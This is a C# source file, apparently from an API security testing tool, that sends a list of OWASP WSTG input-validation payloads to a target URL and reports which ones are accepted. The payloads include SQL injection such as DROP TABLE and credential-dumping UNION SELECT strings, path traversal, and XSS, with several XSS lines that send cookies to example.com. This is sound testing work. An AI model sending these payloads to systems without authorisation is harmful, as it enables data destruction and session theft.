namespace API_Tester;

public partial class MainPage
{
    /*
    WSTG Input Validation Testing Payloads

    Purpose:
    Provides payloads used to test input validation controls in accordance
    with the OWASP Web Security Testing Guide (WSTG). These payloads simulate
    malicious or malformed inputs designed to identify weaknesses in how the
    application validates and processes user-supplied data.

    Threat Model:
    Input validation vulnerabilities occur when applications fail to properly
    validate or sanitize data received from users or external systems.
    Attackers may attempt to exploit these weaknesses to:

        - inject malicious code or commands
        - manipulate application logic
        - access unauthorized resources
        - trigger unexpected application behavior

    Attackers commonly use crafted inputs to exploit vulnerabilities such as:

        - SQL injection
        - NoSQL injection
        - cross-site scripting (XSS)
        - command injection
        - path traversal
        - malformed or unexpected data structures

    Common vulnerabilities include:

        - missing server-side input validation
        - insufficient input sanitization
        - inconsistent validation across application endpoints
        - reliance solely on client-side validation
        - failure to enforce strict input schemas or formats

    Test Strategy:
    The payloads returned by this method represent common attack patterns
    used during WSTG input validation testing. These inputs help determine
    whether the application properly validates, sanitizes, and rejects
    malicious or unexpected data.

    Potential Impact:
    If input validation controls are weak, attackers may:

        - compromise application data or system functionality
        - execute malicious scripts or commands
        - bypass authentication or authorization mechanisms
        - exploit backend systems or services

    Expected Behavior:
    Applications should:

        - enforce strict server-side input validation
        - sanitize or encode untrusted data appropriately
        - reject malformed or unexpected input
        - apply validation consistently across all endpoints
        - monitor and log suspicious input patterns
    */
    
    private static string[] GetWstgInputValidationTestingPayloads() =>
    [
        "' OR '1'='1",
        "<script>alert('xss')</script>",
        "{\"$regex\":\".*\"}",
        "..\\..\\windows\\win.ini",
        "'; DROP TABLE users --",
        "' UNION SELECT null, username, password FROM users --",
        "<img src='x' onerror='alert(1)'>",
        "<svg/onload=alert(1)>",
        "' OR 1=1 --",
        "1' OR 1=1 LIMIT 1 --",
        "<iframe src='javascript:alert(1)'></iframe>",
        "<script>document.location='http://example.com?cookie=' + document.cookie;</script>",
        "<a href='javascript:alert(1)'>Click me</a>",
        "<input type='text' value=''><script>alert(document.cookie)</script>",
        "1' AND 1=1 UNION SELECT username, password FROM users --",
        "<script>alert(String.fromCharCode(88,83,83))</script>",
        "<script>eval('alert(1)')</script>",
        "<script>fetch('http://example.com?cookie=' + document.cookie);</script>",
        "<svg><script>alert('XSS')</script></svg>",
        "<body onload=alert('XSS')>",
        "'; SELECT * FROM information_schema.tables --",
        "<script>document.write('<img src=\'http://example.com?cookie=' + document.cookie + '\'/>');</script>"
    ];

    private HttpRequestMessage FormatWstgInputValidationTestingRequest(Uri baseUri, string payload)
    {
        var probeUri = AppendQuery(baseUri, new Dictionary<string, string>
        {
            ["input"] = payload,
            ["q"] = payload
        });
        return new HttpRequestMessage(HttpMethod.Get, probeUri);
    }

    private async Task<string> RunWstgInputValidationTestingTestsAsync(Uri baseUri)
    {
        var payloads = GetWstgInputValidationTestingPayloads();
        var findings = new List<string>();
        var accepted = 0;

        foreach (var payload in payloads)
        {
            var response = await SafeSendAsync(() => FormatWstgInputValidationTestingRequest(baseUri, payload));
            findings.Add($"Payload '{payload}': {FormatStatus(response)}");
            if (response is not null && (int)response.StatusCode is >= 200 and < 300)
            {
                accepted++;
            }
        }

        findings.Insert(0, $"Payload variants tested: {payloads.Length}");
        findings.Add(accepted > 1
            ? $"Potential risk: WSTG input validation bypass on {accepted}/{payloads.Length} probes."
            : "No obvious WSTG input-validation weakness across tested payloads.");

        return FormatSection("OWASP WSTG Input Validation Testing", baseUri, findings);
    }
}
